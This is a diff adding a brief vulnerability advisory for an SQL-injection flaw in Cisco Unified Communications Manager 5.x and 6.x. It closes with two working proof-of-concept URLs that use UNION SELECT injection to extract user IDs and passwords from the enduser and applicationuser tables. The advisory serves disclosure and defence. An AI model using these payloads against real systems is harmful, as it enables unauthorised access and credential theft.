@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/27775/info
+
+Cisco Unified Communications Manager is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. This issue is tracked by Cisco bug ID CSCsk64286.
+
+This issue affects the following:
+
+Cisco Unified Communication Manager 5.0/5.1 prior to 5.1(3a)
+Cisco Unified Communication Manager 6.0/6.1 prior to 6.1(1a)
+
+https://www.example.org/ccmuser/personaladdressbookEdit.do?key='+UNION+ALL+
+SELECT+'','',firstname,lastname,userid,password+from+enduser;--
+
+https://www.example.org/ccmuser/personaladdressbookEdit.do?key='+UNION+ALL+
+SELECT+'','','',user,'',password+from+applicationuser;-- 
